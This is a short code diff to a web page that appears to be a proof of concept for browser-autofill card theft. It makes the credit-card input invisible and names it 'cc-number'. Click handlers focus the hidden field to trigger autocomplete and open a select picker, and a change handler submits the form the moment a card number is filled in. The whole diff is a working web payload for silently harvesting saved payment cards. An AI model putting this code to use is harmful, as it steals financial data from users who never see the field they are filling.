@@ -5,6 +5,7 @@
 <form id="form" action="/submit" method="GET">
     <input
         id="card"
+        name="cc-number"
         class="input"
         style="font-size: 10px;"
         autocomplete="cc-number"
@@ -24,6 +25,7 @@
 <br>
 
 <style>
+#card,
 #select {
     opacity: 0;
     pointer-events: none;
@@ -41,16 +43,19 @@ const input = document.getElementById("card");
 const select = document.getElementById("select");
 const form = document.getElementById("form");
 
+// Detect when the input value changes
 input.addEventListener("change", () => {
     form.requestSubmit();
 });
 
 document.addEventListener("click", () => {
 
+    // Trigger autocomplete input
     setTimeout(() => {
         input.focus();
     }, 200);
 
+    // Trigger native select picker
     setTimeout(() => {
         if (select.showPicker) {
             try {
